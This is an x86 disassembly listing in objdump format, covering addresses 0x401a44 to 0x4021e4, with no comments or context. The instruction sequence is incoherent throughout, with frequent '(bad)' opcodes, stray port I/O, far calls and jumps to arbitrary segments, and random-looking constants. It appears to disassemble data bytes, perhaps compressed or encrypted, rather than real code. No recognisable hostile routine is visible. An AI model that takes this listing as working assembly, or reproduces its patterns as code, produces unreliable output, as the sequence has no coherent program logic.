  401a44:	and    BYTE PTR [esp+edx*8-0x3dcb4e88],cl
  401a4b:	inc    ebx
  401a4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a4d:	jno    0x401a21
  401a4f:	in     eax,0xf6
  401a51:	pop    es
  401a52:	sahf   
  401a53:	popf   
  401a54:	dec    ebx
  401a55:	or     dh,ah
  401a57:	jmp    0x401a7d
  401a59:	mov    WORD PTR [eax+0x2e],?
  401a5c:	or     eax,0x893d793e
  401a61:	dec    edx
  401a62:	ss pop eax
  401a64:	mov    esp,0x944e1a1d
  401a69:	pop    esp
  401a6a:	cmp    al,0x39
  401a6c:	dec    esp
  401a6d:	mov    ch,0x15
  401a6f:	xchg   edx,eax
  401a70:	mov    edi,ss
  401a72:	push   eax
  401a73:	lock retf 0x6eec
  401a77:	nop
  401a78:	or     BYTE PTR [eax],0x74
  401a7b:	or     esp,DWORD PTR [eax+0x39]
  401a7e:	inc    ebx
  401a7f:	mov    bh,0x1b
  401a81:	adc    DWORD PTR [ebp+0x6e],0xffffffc0
  401a85:	xor    al,0xa5
  401a87:	mov    ds:0x6ac96d55,eax
  401a8c:	(bad)  
  401a8d:	rcl    DWORD PTR [ebx],1
  401a8f:	jnp    0x401a77
  401a91:	into   
  401a92:	adc    BYTE PTR [edi-0x462286ca],cl
  401a98:	mov    WORD PTR [ebx-0x72],?
  401a9b:	test   eax,0xb156896
  401aa0:	or     DWORD PTR [esi-0x47],ebp
  401aa3:	fwait
  401aa4:	push   cs
  401aa5:	cmc    
  401aa6:	push   cs
  401aa7:	popa   
  401aa8:	pop    ebx
  401aa9:	adc    al,0xcc
  401aab:	xchg   esi,eax
  401aac:	pop    ebp
  401aad:	adc    edx,DWORD PTR [ebp-0x3cd86084]
  401ab3:	imul   edi,DWORD PTR [esi+ecx*1-0x23743143],0x24
  401abb:	imul   BYTE PTR [esi]
  401abd:	popa   
  401abe:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  401ac0:	outs   dx,BYTE PTR ds:[esi]
  401ac1:	sbb    BYTE PTR [eax],ch
  401ac3:	rol    DWORD PTR [ebp+0x17],0xd7
  401ac7:	out    dx,al
  401ac8:	add    al,0xa3
  401aca:	ret    0x2197
  401acd:	push   eax
  401ace:	fldcw  WORD PTR [bp+si]
  401ad1:	pop    es
  401ad2:	pushf  
  401ad3:	inc    esi
  401ad4:	pop    edx
  401ad5:	sub    al,BYTE PTR [ecx]
  401ad7:	imul   ecx,edi,0x11
  401ada:	mov    eax,ds:0x76cff22e
  401adf:	ret    
  401ae0:	iret   
  401ae1:	inc    edi
  401ae2:	dec    ebp
  401ae3:	cdq    
  401ae4:	mov    bh,0x7d
  401ae6:	cmp    DWORD PTR [eax],eax
  401ae8:	jecxz  0x401b38
  401aea:	not    BYTE PTR [ebx+edx*4]
  401aed:	inc    ecx
  401aee:	mov    ebp,edx
  401af0:	stos   DWORD PTR es:[edi],eax
  401af1:	arpl   bp,bp
  401af3:	js     0x401b51
  401af5:	sub    DWORD PTR [ebx+eax*1-0xc],eax
  401af9:	or     al,0xc7
  401afb:	mov    bl,0x82
  401afd:	push   esi
  401afe:	add    DWORD PTR [ebp+0x3914b187],edi
  401b04:	xchg   BYTE PTR [ebp-0x3fb654c5],bl
  401b0a:	int    0x3d
  401b0c:	mov    esi,ds
  401b0e:	leave  
  401b0f:	shr    ah,1
  401b11:	aas    
  401b12:	fisttp QWORD PTR [edi]
  401b14:	xor    ch,BYTE PTR [ecx-0x2f2fd3ff]
  401b1a:	mov    ebp,0x89736f70
  401b1f:	cmp    DWORD PTR [esi-0x68],ecx
  401b22:	out    0x64,eax
  401b24:	push   edi
  401b25:	les    ecx,FWORD PTR [edx]
  401b27:	push   cs
  401b28:	and    eax,0xe5e6679c
  401b2d:	mov    edx,0x643388fb
  401b32:	(bad)  
  401b34:	adc    edi,ebp
  401b36:	inc    ebp
  401b37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b38:	or     al,0x21
  401b3a:	and    eax,0xd4f4b214
  401b3f:	lods   al,BYTE PTR ds:[esi]
  401b40:	adc    BYTE PTR [edx],0x12
  401b43:	out    0xc5,al
  401b45:	add    esp,0xa9fea1e8
  401b4b:	jne    0x401b94
  401b4d:	out    0xb3,al
  401b4f:	mov    esi,0xf644ef6d
  401b54:	cmp    eax,0xc9009fa0
  401b59:	cmp    bl,BYTE PTR [eax-0x764a9435]
  401b5f:	scas   al,BYTE PTR es:[edi]
  401b60:	and    eax,0xfb9f1c41
  401b65:	adc    esi,DWORD PTR [esi+0x30]
  401b68:	sub    bl,BYTE PTR ds:0x61c6e7fb
  401b6e:	mov    edi,0xbf51d7e4
  401b73:	pop    DWORD PTR [ebx-0x6e03a4d3]
  401b79:	retf   
  401b7a:	xchg   DWORD PTR [esi+0x46],ebp
  401b7d:	gs push edi
  401b7f:	lock and eax,DWORD PTR [esi+0x28]
  401b83:	popf   
  401b84:	ss mov ch,0x5f
  401b87:	jge    0x401b19
  401b89:	call   0x661c:0xadd81ce7
  401b90:	fisttp DWORD PTR [ebx-0x5b641d81]
  401b96:	test   DWORD PTR [ebp+0x760e68e2],ebx
  401b9c:	(bad)  
  401b9d:	fld    DWORD PTR [edx+0x180ccd6]
  401ba3:	xor    ah,BYTE PTR [ebp+0x438bf5dc]
  401ba9:	fwait
  401baa:	and    al,0xf0
  401bac:	pop    ebx
  401bad:	sbb    al,0xc9
  401baf:	jp     0x401be9
  401bb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401bb2:	mov    WORD PTR [ebx-0x42bf3420],cs
  401bb8:	loop   0x401c0e
  401bba:	dec    BYTE PTR ds:0xd94b42a2
  401bc0:	out    0xb5,al
  401bc2:	bound  eax,QWORD PTR [eax-0x42]
  401bc5:	jb     0x401c35
  401bc7:	mov    gs,WORD PTR [ebx]
  401bc9:	push   esp
  401bca:	mov    ebp,0xde287cc4
  401bcf:	xor    DWORD PTR [ebp+0x7a85533],edi
  401bd5:	popf   
  401bd6:	pop    esi
  401bd7:	fistp  DWORD PTR [ebp+0x1e]
  401bda:	xchg   ebx,eax
  401bdb:	mov    cl,BYTE PTR [edi-0x139f4701]
  401be1:	mov    ebp,0x42e7a517
  401be6:	mov    ds:0x24ec7b57,al
  401beb:	push   edx
  401bec:	jmp    0xb155:0x59871638
  401bf3:	mov    ds:0x2dab96e8,al
  401bf8:	stos   DWORD PTR es:[edi],eax
  401bf9:	sub    DWORD PTR [esi+0x5c79a841],esi
  401bff:	int3   
  401c00:	int    0x19
  401c02:	push   ecx
  401c03:	test   eax,0xe6512fec
  401c08:	je     0x401b9f
  401c0a:	rcr    BYTE PTR ds:0xc91750d,cl
  401c10:	hlt    
  401c11:	stos   DWORD PTR es:[edi],eax
  401c12:	xchg   esp,eax
  401c13:	test   BYTE PTR [ecx+0x58],ch
  401c16:	xchg   ebp,eax
  401c17:	xchg   edx,eax
  401c18:	or     edx,DWORD PTR [ecx]
  401c1a:	sar    BYTE PTR [ebp+0x55],1
  401c1d:	xchg   ebp,eax
  401c1e:	in     eax,dx
  401c1f:	repnz inc ebp
  401c21:	ret    0x8bd3
  401c24:	shr    al,1
  401c26:	fsub   st,st(7)
  401c28:	pop    ds
  401c29:	fs repnz scas eax,DWORD PTR es:[edi]
  401c2c:	xor    BYTE PTR [edx-0x23],cl
  401c2f:	mov    ecx,DWORD PTR [ebx]
  401c31:	xor    ah,bh
  401c33:	mov    DWORD PTR ds:0x922ed3a3,ecx
  401c39:	mov    BYTE PTR [ebp-0x74999070],ch
  401c3f:	cmp    esp,esi
  401c41:	pop    ecx
  401c42:	out    dx,eax
  401c43:	leave  
  401c44:	stos   DWORD PTR es:[edi],eax
  401c45:	adc    dl,BYTE PTR [edx]
  401c47:	jb     0x401cc5
  401c49:	ds xchg edx,eax
  401c4b:	mov    cl,0xd4
  401c4d:	jbe    0x401c81
  401c4f:	inc    edi
  401c50:	pop    es
  401c51:	jl     0x401c4a
  401c53:	mov    ds:0x36128053,eax
  401c58:	sbb    al,0x95
  401c5a:	and    eax,0xc903fb27
  401c5f:	add    BYTE PTR [esi-0x5e],dl
  401c62:	or     BYTE PTR [eax+edi*4+0x703a7312],dh
  401c69:	popa   
  401c6a:	ret    
  401c6b:	lea    ebx,[ecx-0x53b2ac83]
  401c71:	and    al,0x7b
  401c73:	icebp  
  401c74:	loopne 0x401c5f
  401c76:	pop    es
  401c77:	call   0x9d8f:0xdb0b59b1
  401c7e:	mov    bl,BYTE PTR [ecx-0x394adc70]
  401c84:	inc    esi
  401c85:	mov    dl,0xd5
  401c87:	mov    eax,0x594b4b19
  401c8c:	shr    BYTE PTR [edx+0x5b72f1a6],1
  401c92:	shl    bh,0x82
  401c95:	aam    0xde
  401c97:	xchg   edx,eax
  401c98:	in     eax,dx
  401c99:	cmp    BYTE PTR [ecx],cl
  401c9b:	scas   al,BYTE PTR es:[edi]
  401c9c:	js     0x401c91
  401c9e:	mov    dh,0xa2
  401ca0:	test   eax,0xabfdb88c
  401ca5:	mov    ebx,DWORD PTR [ecx-0x6e]
  401ca8:	loopne 0x401d0b
  401caa:	add    eax,0x47d8640a
  401caf:	xchg   edx,eax
  401cb0:	out    dx,al
  401cb1:	call   DWORD PTR [edx-0x25]
  401cb4:	xchg   esp,eax
  401cb5:	ss cmp dh,dl
  401cb8:	mov    ah,0x6e
  401cba:	aam    0x20
  401cbc:	adc    eax,0x470b62b3
  401cc1:	dec    ecx
  401cc2:	jnp    0x401c63
  401cc4:	dec    esi
  401cc5:	and    DWORD PTR [esi-0x40efa971],eax
  401ccb:	sbb    eax,0x6f8f1397
  401cd0:	mov    dl,0xea
  401cd2:	ss sti 
  401cd4:	push   0x59700c17
  401cd9:	loop   0x401d03
  401cdb:	push   edi
  401cdc:	adc    edx,0x2e207621
  401ce2:	xchg   esp,eax
  401ce3:	fsubr  QWORD PTR [ecx-0x1e]
  401ce6:	aaa    
  401ce7:	add    BYTE PTR [ecx+0x7d28e7ba],cl
  401ced:	or     BYTE PTR [ecx+esi*4-0x1b],dl
  401cf1:	lock cmp edx,DWORD PTR [edx]
  401cf4:	sub    eax,0x48fa8877
  401cf9:	dec    esp
  401cfa:	loop   0x401cfa
  401cfc:	pop    esi
  401cfd:	popa   
  401cfe:	outs   dx,DWORD PTR ds:[esi]
  401cff:	aam    0x4c
  401d01:	and    ecx,edx
  401d03:	sar    DWORD PTR [edx+0x7d4a8ee4],0x65
  401d0a:	aaa    
  401d0b:	les    edx,FWORD PTR [eax]
  401d0d:	cwde   
  401d0e:	add    al,0x74
  401d10:	push   ebp
  401d11:	popa   
  401d12:	shl    BYTE PTR [edi+0x29341294],cl
  401d18:	addr16 and eax,0xcee0a05c
  401d1e:	(bad)  
  401d1f:	mov    cl,0xa4
  401d21:	test   dl,ah
  401d23:	sbb    bh,BYTE PTR [edi+0x59]
  401d26:	test   DWORD PTR [esi+0x3a15a06e],ebp
  401d2c:	rcr    BYTE PTR [eax],0x8d
  401d2f:	xchg   esp,eax
  401d30:	xor    al,BYTE PTR [edi-0x53]
  401d33:	pop    ss
  401d34:	pop    es
  401d35:	je     0x401cbc
  401d37:	push   0xfffffffb
  401d39:	xchg   BYTE PTR [eax+0x5c],bh
  401d3c:	popa   
  401d3d:	ins    BYTE PTR es:[edi],dx
  401d3e:	adc    eax,0xa796d55f
  401d43:	sub    DWORD PTR [ebx+0x3f],edi
  401d46:	xchg   ebp,eax
  401d47:	dec    esi
  401d48:	or     DWORD PTR [esi],eax
  401d4a:	sub    BYTE PTR [eax-0x4f],dl
  401d4d:	sti    
  401d4e:	adc    ah,bh
  401d50:	pushf  
  401d51:	mov    edx,0x5a6ffa6c
  401d56:	xchg   edi,eax
  401d57:	es iret 
  401d59:	aaa    
  401d5a:	fdiv   st,st(4)
  401d5c:	ja     0x401db8
  401d5e:	loopne 0x401da9
  401d60:	push   0xffffffe3
  401d62:	sbb    al,0x39
  401d64:	cs pop ss
  401d66:	lock (bad) 
  401d69:	push   esi
  401d6a:	xchg   edi,eax
  401d6b:	pop    ss
  401d6c:	pop    esp
  401d6d:	popf   
  401d6e:	xchg   esi,eax
  401d6f:	or     eax,0x7eba8e2a
  401d74:	add    bl,BYTE PTR [edi]
  401d76:	mov    bl,BYTE PTR [esi-0xa]
  401d79:	les    ebp,FWORD PTR [esi-0x61]
  401d7c:	jge    0x401dfc
  401d7e:	jmp    DWORD PTR [ebx+0x7482f77f]
  401d84:	jmp    0x401dc4
  401d86:	mov    esi,0x9faf840d
  401d8b:	add    ecx,DWORD PTR [eax+ebx*4-0x3d]
  401d8f:	adc    DWORD PTR [edx],ecx
  401d91:	mov    al,0x8
  401d93:	jp     0x401d47
  401d95:	nop
  401d96:	das    
  401d97:	frstor [ebp+0x4]
  401d9a:	jecxz  0x401dba
  401d9c:	daa    
  401d9d:	out    dx,al
  401d9e:	data16 fdivr st,st(7)
  401da1:	in     al,0xed
  401da3:	sar    dh,cl
  401da5:	push   ebp
  401da6:	jge    0x401d90
  401da8:	add    DWORD PTR [eax-0x6e],edx
  401dab:	retf   0x9cb3
  401dae:	or     al,0x40
  401db0:	je     0x401d48
  401db2:	js     0x401d67
  401db4:	mov    ch,0x97
  401db6:	push   ebx
  401db7:	inc    esi
  401db8:	sub    BYTE PTR [edi],ch
  401dba:	or     edi,DWORD PTR [ecx-0xd]
  401dbd:	mov    ah,0xd9
  401dbf:	mov    bh,0x2a
  401dc1:	xor    edi,DWORD PTR [edx+0x70]
  401dc4:	jnp    0x401da7
  401dc6:	xchg   ecx,eax
  401dc7:	repz xchg esi,eax
  401dc9:	dec    ecx
  401dca:	dec    edi
  401dcb:	pushf  
  401dcc:	cmp    al,0xac
  401dce:	gs dec ebx
  401dd0:	mov    bl,ch
  401dd2:	popa   
  401dd3:	and    eax,0xecf643d8
  401dd8:	cmp    eax,0xf9b53640
  401ddd:	fwait
  401dde:	enter  0xba40,0xce
  401de2:	rcr    DWORD PTR [ebx-0x5d],0xaf
  401de6:	das    
  401de7:	xor    ebp,ebp
  401de9:	and    eax,DWORD PTR [edi]
  401deb:	retf   
  401dec:	and    bh,ah
  401dee:	inc    esp
  401def:	push   ebx
  401df0:	sar    BYTE PTR [ebx],1
  401df2:	sub    ebp,DWORD PTR [edi-0x4d]
  401df5:	push   ebp
  401df6:	push   esi
  401df7:	dec    esp
  401df8:	jle    0x401dbd
  401dfa:	xchg   BYTE PTR [esp+ecx*2+0x73918cda],cl
  401e01:	or     BYTE PTR [eax+edi*8],cl
  401e04:	ret    
  401e05:	sbb    al,0x1e
  401e07:	pop    ss
  401e08:	icebp  
  401e09:	jb     0x401e08
  401e0b:	and    edx,DWORD PTR [edi-0x7b]
  401e0e:	out    dx,eax
  401e0f:	or     al,0xa1
  401e11:	xor    bl,BYTE PTR ds:0x85f8e502
  401e17:	nop
  401e18:	inc    esi
  401e19:	push   edi
  401e1a:	stos   BYTE PTR es:[edi],al
  401e1b:	aas    
  401e1c:	aad    0x8d
  401e1e:	pop    ds
  401e1f:	bound  eax,QWORD PTR [edx-0x4a]
  401e22:	fst    st(6)
  401e24:	xchg   ecx,eax
  401e25:	xchg   edx,eax
  401e26:	pushf  
  401e27:	loope  0x401e87
  401e29:	ins    DWORD PTR es:[edi],dx
  401e2a:	mov    ebx,0x3361092b
  401e2f:	push   ebx
  401e30:	icebp  
  401e31:	cmp    esi,DWORD PTR [edi]
  401e33:	push   ebp
  401e34:	outs   dx,DWORD PTR ds:[esi]
  401e35:	push   edi
  401e36:	ret    0xf720
  401e39:	pop    ds
  401e3a:	or     DWORD PTR [ecx-0x7645f732],0x1d
  401e41:	mov    ebx,0x519d99e8
  401e46:	cmp    eax,0x18803b30
  401e4b:	cmc    
  401e4c:	scas   eax,DWORD PTR es:[edi]
  401e4d:	push   ebx
  401e4e:	pop    esp
  401e4f:	fidiv  WORD PTR [ebp-0x39d2259c]
  401e55:	xchg   DWORD PTR [edx+ebx*8-0x3a],esi
  401e59:	push   ebx
  401e5a:	in     al,dx
  401e5b:	pop    ss
  401e5c:	js     0x401dea
  401e5e:	jmp    0x811b5648
  401e63:	lods   eax,DWORD PTR ds:[esi]
  401e64:	jl     0x401eb5
  401e66:	pusha  
  401e67:	mov    dl,0xed
  401e69:	xchg   DWORD PTR [ebp-0x564e9288],edi
  401e6f:	pop    edi
  401e70:	mov    eax,0x638f4b61
  401e75:	(bad)  
  401e76:	in     eax,0x61
  401e78:	push   es
  401e79:	test   DWORD PTR [eax+0x4f],ebp
  401e7c:	and    ebp,esp
  401e7e:	imul   DWORD PTR [edi]
  401e80:	mov    cl,0xbd
  401e82:	data16 ja 0x401e38
  401e85:	sub    al,BYTE PTR [ebp-0x66938d64]
  401e8b:	cmp    eax,0xd01529fe
  401e90:	mov    al,0x4b
  401e92:	mov    cl,0x2b
  401e94:	mov    esi,0x7a275449
  401e99:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e9a:	int3   
  401e9b:	fstp   TBYTE PTR [edx]
  401e9d:	lahf   
  401e9e:	rcl    DWORD PTR [ecx+edx*4+0x25],0x4d
  401ea3:	jae    0x401f18
  401ea5:	add    ah,al
  401ea7:	jecxz  0x401edd
  401ea9:	mov    cl,0x67
  401eac:	mov    ah,0x50
  401eae:	xchg   ecx,eax
  401eaf:	mov    dh,0xde
  401eb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401eb2:	pop    ss
  401eb3:	mov    ah,bl
  401eb5:	sbb    eax,0x40f9ce5a
  401eba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ebb:	push   0x9d6a78db
  401ec0:	fsubr  DWORD PTR [edx-0x8]
  401ec3:	stos   BYTE PTR es:[edi],al
  401ec4:	inc    ecx
  401ec5:	js     0x401e4a
  401ec7:	pusha  
  401ec8:	mov    dh,0xb8
  401eca:	dec    ebp
  401ecb:	and    DWORD PTR [ecx+eiz*4+0x36d9c96f],0xfffffff9
  401ed3:	add    esp,edi
  401ed5:	sbb    esp,DWORD PTR [ebp-0x11]
  401ed8:	addr16 ja 0x401e8a
  401edb:	xchg   esp,eax
  401edc:	frstor [ebp+ebx*8-0x6d526139]
  401ee3:	arpl   WORD PTR [edx],sp
  401ee5:	ins    DWORD PTR es:[edi],dx
  401ee6:	pop    es
  401ee7:	push   0x4c
  401ee9:	pop    ds
  401eea:	pusha  
  401eeb:	dec    edx
  401eec:	adc    DWORD PTR [ebx+edx*4],0xf22e8822
  401ef3:	retf   0x5e03
  401ef6:	adc    DWORD PTR [eax+0x23],ecx
  401ef9:	call   FWORD PTR [esi+0x38]
  401efc:	std    
  401efd:	fcmovu st,st(1)
  401eff:	call   0x2a58:0x48eb7a4f
  401f06:	push   ss
  401f07:	mov    dl,0x13
  401f09:	push   0x9cb44995
  401f0e:	or     BYTE PTR [esi],0xf7
  401f11:	push   es
  401f12:	fistp  DWORD PTR [eax+0x2dbcadeb]
  401f18:	ret    
  401f19:	add    ah,BYTE PTR [edi+0x7d2c3180]
  401f1f:	push   ebx
  401f20:	xor    DWORD PTR [edx-0x2],eax
  401f23:	cmc    
  401f24:	cmovg  ebp,DWORD PTR [ecx]
  401f27:	scas   al,BYTE PTR es:[edi]
  401f28:	sub    dh,bl
  401f2a:	cmp    BYTE PTR [ebx-0x1bcfd653],bl
  401f30:	mov    DWORD PTR [eax+0x232bacaa],ecx
  401f36:	cmp    al,0xb
  401f38:	jmp    0x401f3e
  401f3a:	aam    0x5d
  401f3c:	popf   
  401f3d:	dec    ecx
  401f3e:	sbb    edx,DWORD PTR [edx]
  401f40:	mov    esp,0x66e4c93e
  401f45:	inc    ebx
  401f46:	ficom  WORD PTR [ebx]
  401f48:	lock (bad) 
  401f4a:	in     eax,0x63
  401f4c:	add    DWORD PTR [edi+ecx*2+0x65928c6],eax
  401f53:	sahf   
  401f54:	jp     0x401f8d
  401f56:	aas    
  401f57:	cmp    ebp,DWORD PTR [eax+ebp*2-0xd]
  401f5b:	mov    cl,0x2e
  401f5d:	inc    esp
  401f5e:	gs jo  0x401f48
  401f61:	add    bl,0x76
  401f64:	std    
  401f65:	loope  0x401f78
  401f67:	xchg   esi,eax
  401f68:	pop    esp
  401f69:	mov    eax,0xdd3e6ac3
  401f6e:	fsub   st(6),st
  401f70:	in     eax,dx
  401f71:	in     al,dx
  401f72:	(bad)
  401f75:	pop    esi
  401f76:	or     eax,0xe259f2cc
  401f7b:	and    al,0x89
  401f7d:	fist   WORD PTR gs:[edx-0x9e97268]
  401f84:	popf   
  401f85:	mov    edi,0xe0ef412
  401f8a:	adc    al,BYTE PTR [edi+eax*4]
  401f8d:	rcl    DWORD PTR ds:0xaae4788b,1
  401f93:	jae    0x401fe5
  401f95:	ins    DWORD PTR es:[edi],dx
  401f96:	int    0x4c
  401f98:	into   
  401f99:	push   cs
  401f9a:	xchg   ebp,eax
  401f9b:	xor    BYTE PTR [ebp+0x137be1f5],cl
  401fa1:	inc    ebx
  401fa2:	arpl   WORD PTR [ecx+0x51],sp
  401fa5:	inc    ebp
  401fa6:	adc    ah,BYTE PTR [ebx+0xb]
  401fa9:	lea    esi,[edx-0x98e5f50]
  401faf:	jmp    0xc5fccfcf
  401fb4:	inc    esi
  401fb5:	cmp    al,0x13
  401fb7:	fdivr  QWORD PTR [ecx-0x109cc483]
  401fbd:	leave  
  401fbe:	mov    cl,0xbc
  401fc0:	xchg   ebp,eax
  401fc1:	outs   dx,BYTE PTR ds:[esi]
  401fc2:	mov    ebp,0x20de5218
  401fc7:	out    0xc4,eax
  401fc9:	popa   
  401fca:	mov    gs,WORD PTR [edx-0x5b1be697]
  401fd0:	dec    esp
  401fd1:	fcomp  QWORD PTR [eax+0x5b797bba]
  401fd7:	push   esi
  401fd8:	mov    eax,ds:0xa4a2b0c7
  401fdd:	add    edx,DWORD PTR [edx-0x22]
  401fe0:	push   edi
  401fe1:	retf   
  401fe2:	pusha  
  401fe3:	push   esp
  401fe4:	sub    DWORD PTR [esi+0x45],eax
  401fe7:	and    BYTE PTR [ebp+0x7b],cl
  401fea:	jp     0x401f95
  401fec:	push   ss
  401fed:	cmc    
  401fee:	pop    eax
  401fef:	loope  0x402001
  401ff1:	sbb    eax,ebp
  401ff3:	bound  ecx,QWORD PTR [ebx]
  401ff5:	aaa    
  401ff6:	lods   eax,DWORD PTR ds:[esi]
  401ff7:	push   ecx
  401ff8:	mov    ds:0x4b1cc050,al
  401ffd:	adc    eax,0xfade6e44
  402002:	lock lds edi,FWORD PTR [esi+ebp*1-0x23ee71f6]
  40200a:	pop    ecx
  40200b:	pop    esp
  40200c:	pop    ebx
  40200d:	add    DWORD PTR [esi],esp
  40200f:	mov    gs,WORD PTR [eax]
  402011:	popf   
  402012:	fwait
  402013:	cmp    BYTE PTR [edx],ah
  402015:	(bad)  
  402016:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402017:	and    eax,0x3ecc271c
  40201c:	push   cs
  40201d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40201e:	sbb    ah,BYTE PTR [esp+eax*4]
  402021:	dec    ebx
  402022:	xchg   ebp,eax
  402023:	and    al,BYTE PTR [edx-0x7c98ecf0]
  402029:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40202a:	mov    dh,0x55
  40202c:	shl    BYTE PTR [eax],0xd5
  40202f:	dec    edx
  402030:	jae    0x402081
  402032:	xchg   ecx,eax
  402033:	jmp    0x7bdf:0x6f4dd16
  40203a:	mov    esi,0x16dd4a57
  40203f:	sub    bh,0xb8
  402042:	xchg   ebx,eax
  402043:	outs   dx,DWORD PTR ds:[esi]
  402044:	inc    esp
  402045:	add    al,0x94
  402047:	(bad)  
  402048:	fidiv  WORD PTR [edx]
  40204a:	jnp    0x401fcc
  40204c:	nop
  40204d:	push   ebp
  40204e:	jno    0x402076
  402050:	add    bl,BYTE PTR [ebx]
  402052:	push   ss
  402053:	mov    esi,0xfcec6683
  402058:	imul   ebp,edx,0xffffffc9
  40205b:	pop    eax
  40205c:	sbb    ebp,ebx
  40205e:	mov    al,0x33
  402060:	dec    ebp
  402061:	fcmovnb st,st(4)
  402063:	rcl    DWORD PTR [edi+eiz*1-0x6d],0x86
  402068:	dec    esi
  402069:	sbb    BYTE PTR [ebx+ecx*1],dh
  40206c:	mov    esp,0x30acb78f
  402071:	xchg   ebx,eax
  402072:	jg     0x4020e4
  402074:	push   esp
  402075:	push   cs
  402076:	scas   al,BYTE PTR es:[edi]
  402077:	fisttp DWORD PTR [eax]
  402079:	mov    edi,0xd8e4e8cf
  40207e:	mov    ds:0xcbee9f7c,eax
  402083:	pop    eax
  402084:	jbe    0x40202e
  402086:	imul   BYTE PTR [ecx+eax*2-0x14]
  40208a:	sti    
  40208b:	out    0x6e,eax
  40208d:	cld    
  40208e:	sahf   
  40208f:	mov    al,ds:0x7cbe1680
  402094:	stos   DWORD PTR es:[edi],eax
  402095:	mov    BYTE PTR [ebp+0x41e6048b],dh
  40209b:	sbb    BYTE PTR [edx-0x2410c6ee],dh
  4020a1:	add    al,cl
  4020a3:	inc    eax
  4020a4:	cdq    
  4020a5:	inc    ebp
  4020a6:	shl    DWORD PTR [esp+ebp*1-0x6a],0x55
  4020ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020ac:	test   DWORD PTR [ebp+ebp*8+0x34],edx
  4020b0:	loop   0x4020bd
  4020b2:	sbb    eax,0x2cec6992
  4020b7:	test   eax,0x7838c090
  4020bc:	cmp    DWORD PTR [ecx-0x58d536b3],esi
  4020c2:	cli    
  4020c3:	fsub   QWORD PTR [eax+0x1cc8020]
  4020c9:	js     0x402133
  4020cb:	repz dec eax
  4020cd:	test   al,0x96
  4020cf:	or     cl,cl
  4020d1:	ret    
  4020d2:	inc    ebx
  4020d3:	sbb    eax,DWORD PTR [edi-0x1aeabd35]
  4020d9:	call   0x82d4:0xfde55651
  4020e0:	call   0xa232051e
  4020e5:	xchg   ebx,eax
  4020e6:	iret   
  4020e7:	and    BYTE PTR [esi],bh
  4020e9:	shl    BYTE PTR [ecx+ebx*1],cl
  4020ec:	and    al,0x6e
  4020ee:	in     eax,0x9d
  4020f0:	mov    esp,ebx
  4020f2:	shl    BYTE PTR [ecx+0x43a817a8],cl
  4020f8:	cdq    
  4020f9:	mov    DWORD PTR [edx+ecx*1],eax
  4020fc:	nop
  4020fd:	xchg   edi,eax
  4020fe:	mov    dh,0x4a
  402100:	push   esi
  402101:	fiadd  DWORD PTR [ebp-0x1d]
  402104:	cmp    DWORD PTR [ebx+0x25540378],ebp
  40210a:	cmp    BYTE PTR [edi-0x144da934],dh
  402110:	cmp    ah,ch
  402112:	mov    eax,ds:0x7e92c659
  402117:	mov    ds:0x2d631a86,eax
  40211c:	scas   al,BYTE PTR es:[edi]
  40211d:	dec    ebx
  40211e:	or     dh,al
  402120:	mov    bl,bl
  402122:	sub    BYTE PTR [edx],al
  402124:	jl     0x40215b
  402126:	jp     0x40213c
  402128:	ror    DWORD PTR [eax+0x38],0x45
  40212c:	xchg   dl,ah
  40212e:	dec    edx
  40212f:	in     al,dx
  402130:	or     bh,BYTE PTR [eax-0x22]
  402133:	mov    edi,0x74c17f77
  402138:	(bad)
  40213c:	add    al,0xf1
  40213e:	scas   al,BYTE PTR es:[edi]
  40213f:	outs   dx,BYTE PTR ds:[esi]
  402140:	fnstsw WORD PTR ds:0x87f26a2a
  402146:	mov    edi,0xb0744595
  40214b:	stos   DWORD PTR es:[edi],eax
  40214c:	sbb    eax,0x852b6c19
  402151:	xchg   edi,eax
  402152:	out    0xa1,eax
  402154:	sub    eax,0xe58e03a
  402159:	shl    BYTE PTR [eax],0x75
  40215c:	fcomp  DWORD PTR [eax+0x5505d39f]
  402162:	stos   DWORD PTR es:[edi],eax
  402163:	push   0x8cb511e2
  402168:	cwde   
  402169:	imul   esi,ecx,0x307e802d
  40216f:	fstp   DWORD PTR [eax-0x4]
  402172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402173:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402174:	lahf   
  402175:	mov    bh,0xdd
  402177:	sbb    eax,0x5c274205
  40217c:	ins    BYTE PTR es:[edi],dx
  40217d:	mov    ecx,0x796fffda
  402182:	push   ebx
  402183:	mov    edx,edx
  402185:	ret    
  402186:	jmp    0x402114
  402188:	leave  
  402189:	dec    edx
  40218a:	aad    0x33
  40218c:	bsr    eax,ebx
  40218f:	push   ss
  402190:	add    dl,cl
  402192:	push   ebp
  402193:	bound  edx,QWORD PTR [edx]
  402195:	outs   dx,DWORD PTR ds:[esi]
  402196:	in     al,dx
  402197:	dec    eax
  402198:	mov    dh,0x99
  40219a:	sub    eax,0xa89440c9
  40219f:	out    0x55,eax
  4021a1:	xor    eax,0xe2c1e4b4
  4021a6:	cmc    
  4021a7:	mov    esi,0x6a8336f4
  4021ac:	dec    edi
  4021ad:	mov    esi,0xdeb844e9
  4021b2:	xor    ebx,ebp
  4021b4:	jns    0x402210
  4021b6:	in     al,dx
  4021b7:	jle    0x4021f1
  4021b9:	adc    al,0x3e
  4021bb:	das    
  4021bc:	or     bh,BYTE PTR [ebx]
  4021be:	in     al,dx
  4021bf:	and    ebx,eax
  4021c1:	call   0x6f65:0xf1425dd4
  4021c8:	pop    ecx
  4021c9:	in     al,0x5b
  4021cb:	pop    esi
  4021cc:	push   cs
  4021cd:	mov    ebp,0x6f26e222
  4021d2:	mov    dh,0x21
  4021d4:	psubusb mm0,QWORD PTR [edx-0x1f3953b7]
  4021db:	loop   0x4021e1
  4021dd:	cwde   
  4021de:	int    0xb8
  4021e0:	popa   
  4021e1:	out    dx,al
  4021e2:	std    
  4021e3:	lahf   
  4021e4:	pusha  
